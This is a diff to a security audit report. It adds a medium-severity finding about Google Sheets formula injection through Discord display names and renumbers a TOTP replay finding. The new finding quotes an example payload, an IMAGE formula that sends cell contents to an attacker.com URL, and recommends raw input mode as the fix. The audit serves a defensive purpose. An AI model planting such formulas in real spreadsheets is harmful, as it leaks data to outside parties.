@@ -16,7 +16,7 @@ This audit covers authentication, authorization, API security, data handling, se
 |----------|-------|
 | Critical | 2 |
 | High | 4 |
-| Medium | 6 |
+| Medium | 7 |
 | Low | 10 |
 | Info | 3 |
 
@@ -181,7 +181,18 @@ The `account` table stores `accessToken`, `refreshToken`, and `idToken` as plain
 
 ---
 
-### M6. `@repo/twofa` Package Has No Replay Protection
+### M6. Google Sheets Formula Injection Risk
+
+**App:** basecamp
+**File:** `apps/basecamp/src/sheet/sheet.service.ts:76`
+
+The Sheets API client uses `valueInputOption: "USER_ENTERED"` when appending rows. Since Discord display names (written to the `discordName` column) are user-controlled, an attacker could set their Discord nickname to a formula like `=IMPORTRANGE(...)` or `=IMAGE("https://attacker.com/exfil?data="&A1)` to exfiltrate data or cause unexpected behavior in the spreadsheet.
+
+**Recommendation:** Switch to `valueInputOption: "RAW"` to prevent formula interpretation, or sanitize values by prefixing user-controlled strings with a single quote (`'`).
+
+---
+
+### M7. `@repo/twofa` Package Has No Replay Protection
 
 **Package:** `@repo/twofa`
 **File:** `packages/twofa/src/core/totp.ts`
